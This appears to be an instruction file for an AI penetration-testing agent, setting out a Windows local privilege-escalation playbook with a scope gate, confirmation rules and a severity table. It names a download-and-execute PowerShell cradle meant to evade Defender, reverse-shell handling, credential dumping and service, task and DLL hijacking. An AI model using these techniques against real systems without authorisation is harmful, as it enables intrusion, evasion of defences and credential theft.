---
name: hunt-windows
description: Local Windows privilege escalation on a STANDALONE / workgroup host, or a local shell on a domain member - foothold to SYSTEM. Token privileges (SeImpersonate/Potato), service misconfig (weak perms / unquoted path / writable binary), registry autologon creds, scheduled-task + writable-script abuse, DLL hijack, AlwaysInstallElevated, UAC bypass, credential loot. For DOMAIN escalation (kerberoast/DCSync/ADCS/BloodHound) use hunt-ad instead. Wiki-first, FIND schema output.
---

# Hunt: Windows (local privilege escalation)

**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration limits, stop conditions, wiki protocol, FIND output, and Deadends. Do not re-derive any of that here.

**Scope of this skill vs `hunt-ad`:** this is LOCAL privesc on ONE Windows host - a standalone/workgroup box, or getting from a low-priv user to SYSTEM on a domain member. **DOMAIN** escalation (user enum, AS-REP/Kerberoast, delegation, ADCS, DCSync, BloodHound) is `Skill(hunt-ad)`. Tell them apart from the SMB/enum banner: a **single-label** `domain:` that equals the hostname (e.g. `domain:PRIVESC`) or `WORKGROUP` = standalone -> this skill; a **dotted FQDN** realm (`domain:corp.local`) or a DC (kerberos/88) = AD -> hunt-ad. On a domain member both can apply (local SYSTEM here, domain moves there).

## Wiki

```
qmd_query "Windows local privilege escalation service misconfig unquoted path SeImpersonate potato AlwaysInstallElevated autologon scheduled task DLL hijack UAC bypass" via wiki-search MCP
```

Primary page: [[windows-privesc]] (the full checklist + commands + Defender-evasion-at-the-loader). Enumeration: [[windows-enumeration]]. Kernel-LPE / Potato fallback arsenal: [[privesc-exploit-arsenal]].
Tool anchor: [[netexec]] (the full nxc map). Even on a standalone box nxc is the remote-side workhorse: `--local-auth` credential checks across the subnet, `--shares`/`--dir`/`-M spider_plus`, `--sam`/`--lsa`/`--dpapi` looting, `-M enum_av` before you drop a payload, `--tasklist`/`--qwinsta` instead of noisy `-x` equivalents, and the loot modules (winscp, putty, rdcman, mremoteng, keepass, notepad, eventlog_creds) that beat manual hunting for stored creds.

## Exec channel (read this before driving a shell)

Windows footholds are usually RDP or a reverse shell, rarely WinRM (unless the user is in Remote Management Users). Drive a PowerShell reverse shell with `bash scripts/win-rsh.sh <eng> '<one command>'` and follow `docs/shell-interaction.md`: ONE command per call, NO injected markers, type `$env:`/`$_` plainly (it escapes for the bridge). RDP-only, non-admin, non-WinRM user -> headless xfreerdp + an in-memory PS cradle (see [[network-services]]). **Defender is often live:** a dropped `RunasCs.exe`/`winPEASx64.exe` gets quarantined - deliver in-memory (`IEX(New-Object Net.WebClient).DownloadString(...)`), or a freshly-compiled (unsigned-but-unknown) stager, or a Microsoft-signed tool (`accesschk`). Solve evasion once at the loader ([[windows-privesc]]).

## Methodology

1. **Enumerate first - tool then manual.** Run `Skill(arsenal)` to pick the tool, then winPEAS / PrivescCheck.ps1 (in-memory if Defender is live). Read [[windows-enumeration]]. Then walk the manual checklist below - the intended path is almost always ONE of these, and a limited/service token may be blind to WMI so cross-check from an earlier shell in the chain.
2. **Token privileges** - `whoami /priv`. **SeImpersonate / SeAssignPrimaryToken** (common on service accounts: IIS/MSSQL) -> Potato (PrintSpoofer/GodPotato/RoguePotato) -> SYSTEM. SeBackup/SeRestore -> read SAM/SYSTEM hives. SeDebug -> inject into a SYSTEM process. **If SeImpersonate is ABSENT, do NOT stop** - it is a deliberate block; go to the other vectors.
3. **Services** - `sc qc <svc>` / `Get-CimInstance Win32_Service`. Weak service DACL (accesschk `-uwcqv <user> *` -> `sc config binPath=`), **writable service binary** (`icacls` shows `Everyone`/`Users`/you with `(F)`/`(M)` -> overwrite + `sc start`; runs as the service account), unquoted service path with a writable dir, or a writable `HKLM\SYSTEM\CurrentControlSet\Services\<svc>` ImagePath.
4. **Registry autologon creds** - `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` -> `DefaultUserName`/`DefaultPassword` when `AutoAdminLogon=1`. Reuse the recovered cred (runas / RDP / `Start-Process -Credential`).
5. **Scheduled tasks** - `schtasks /query /fo LIST /v`; a task running as SYSTEM whose action binary OR **a script it runs (`.bat`/`.ps1`)** is writable = overwrite + wait for/trigger the task. Note the wrapper case (`cmd /c script.bat`) that `icacls` on the "Task To Run" misses.
6. **Writable-file sweep (last resort when 2-5 are dry)** - `accesschk.exe /accepteula -uwqs <user> C:\` (files) and `-uwdqs <user> C:\` (dirs). A writable script/binary under `C:\Windows\Tasks`, `C:\ProgramData`, or a program dir that a SYSTEM process/task runs is a direct SYSTEM foothold. See [[windows-privesc]].
7. **AlwaysInstallElevated** - both `reg query HKLM\...\Installer /v AlwaysInstallElevated` AND HKCU = `0x1` -> a crafted `.msi` installs as SYSTEM.
8. **DLL hijack** - a service/SYSTEM process loading a DLL from a writable dir in its search path (writable PATH entry or app dir) -> plant the DLL.
9. **Credential loot** - `cmdkey /list` (+ `runas /savecred`), Credential Manager / DPAPI, `unattend.xml`/`sysprep.inf`, PowerShell history, config/`.kdbx`, registry. Reuse across users/services before hunting new ones.
10. **UAC bypass** - admin-but-medium-integrity -> a fodhelper/other auto-elevate bypass to high integrity (see [[windows-privesc]]).

Distill a confirmed reusable technique per hunt-core: `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page cheatsheets/windows-privesc.md`.

## Confirmation gate

Windows-local specific; adds to the `hunt-core` gate.

**NOT confirmation:** a writable service binary / `AlwaysInstallElevated` key / `SeImpersonate` in the token / an unquoted path - these are *conditions*, not a demonstrated escalation. A reflected `whoami` that returns `root`/`kali` or your attacker host is the **false-RCE trap** (a dead reverse shell fell back to the attacker box) - re-pop, do not claim it (`win-rsh` flags this).

**IS confirmation:** you actually ran code / read a file AS the higher principal and proved it - a shell or command whose `whoami` returns the service account / `nt authority\system` (from the TARGET, re-verified), the protected file read, the SYSTEM flag captured - reproduced from your own written steps in a clean session.

## Severity

| Severity | Class |
|---|---|
| CRITICAL | SYSTEM / local Administrator code exec |
| HIGH | escalation to another privileged local user / service account, SAM+SYSTEM hive dump |
| MEDIUM | limited token/privilege gain, a cred that only reuses laterally |
